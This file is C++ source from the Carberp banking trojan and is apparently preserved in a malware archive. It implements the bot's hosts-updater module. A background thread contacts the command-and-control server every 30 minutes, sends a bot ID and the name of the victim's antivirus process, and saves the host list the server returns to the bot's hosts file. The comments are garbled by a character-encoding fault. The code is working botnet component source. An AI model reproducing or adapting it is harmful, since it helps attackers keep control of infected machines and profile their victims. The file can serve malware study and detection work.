/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------

#pragma hdrstop

#include "HostsAutoUpdate.h"
#include "Config.h"
#include "BotHosts.h"
#include "BotHTTP.h"
#include "Utils.h"
#include "Modules.h"
#include "BotCore.h"
//---------------------------------------------------------------------------


#include "BotDebug.h"

namespace HostsDebugSpace
{
    #include "DbgTemplates.h"
}

#define HOSTSDBG  HostsDebugSpace::DBGOutMessage<>

//****************************************************************************
//                                THostsUpdater
//****************************************************************************
THostsUpdater::THostsUpdater()
	: TBotThread(false)
{
//	Interval = 5 * 60 * 1000;   // �������� � �������
	Interval = 30 * 60 * 1000;  // �������� 1 ���

	Start();
}
//-----------------------------------------------------------

THostsUpdater::~THostsUpdater()
{

}
//-----------------------------------------------------------

void THostsUpdater::DoExecute()
{
	// ��������� ���� �������� ������
	// ������� ������� ���������� �� ������������� ����������
	pSleep(4000);

	HOSTSDBG("HostsUpdater", "��������� ���������� ������");

	while (!Terminated())
	{
		DWORD UpdateInterval = Interval;
		Update(UpdateInterval);

		// ������������ �����
		pSleep(UpdateInterval);
    }

}
//-----------------------------------------------------------

void THostsUpdater::Update(DWORD &UpdateInterval)
{
	// ��������� ������ ������

	PCHAR URL = GetBotScriptURL(SCRIPT_UPDATE_HOSTS);
	if (!URL)
	{
		UpdateInterval = 30000;
		return;
    }


	#ifdef CryptHTTPH
		TCryptHTTP HTTP;
		HTTP.Password = GetMainPassword2();
	#else
		THTTP HTTP;
	#endif

	// ��������� ����
	TBotStrings Fields;

	string AV = GetAntiVirusProcessName();
	string UID     = GenerateBotID2();

	Fields.AddValue("uid", UID.t_str());
	Fields.AddValue("av",  AV.t_str());

	HOSTSDBG("HostsUpdater", "��������� ������ ������:\r\nURL: %s\r\nUID: %s\r\nAV: %s", URL, UID.t_str(), AV.t_str());

	// ���������� ������
	HTTP.CheckOkCode = false;
	string Buf;
	bool Done = HTTP.Post(URL, &Fields, Buf);
	if (!Done)
	{
		// �� ������� ��������� ������ � �������
		UpdateInterval = 30000;
		return;
	}

	if (HTTP.Response.Code == 403 && !Buf.IsEmpty())
		SaveHosts(Buf);

	STR::Free(URL);
}
//-----------------------------------------------------------

void THostsUpdater::SaveHosts(const string &Buf)
{
	// ��������� ������ ������
	TBotStrings H;
	H.SetText(Buf);

	PHostList List = Hosts::CreateList();

	HOSTSDBG("HostsUpdater", "����������� �����:");

    bool Added = false;

	for (int i = 0; i < H.Count(); i++)
	{
		string Host = H.GetItem(i);
		if (!Host.IsEmpty())
		{
            Added = true;
			HOSTSDBG("HostsUpdater", "     %s", Host.t_str());
			Hosts::AddHost(List, Host);
        }
    }

	if (Added)
	{
		PCHAR FileName = BOT::GetHostsFileName();

		Hosts::SaveListToFile(List, FileName, true);

		STR::Free(FileName);
    }

	Hosts::FreeList(List);
}
//-----------------------------------------------------------

// ������� ��������� �������������� ���������� ������
void StartHostsUpdater()
{
	new THostsUpdater();
}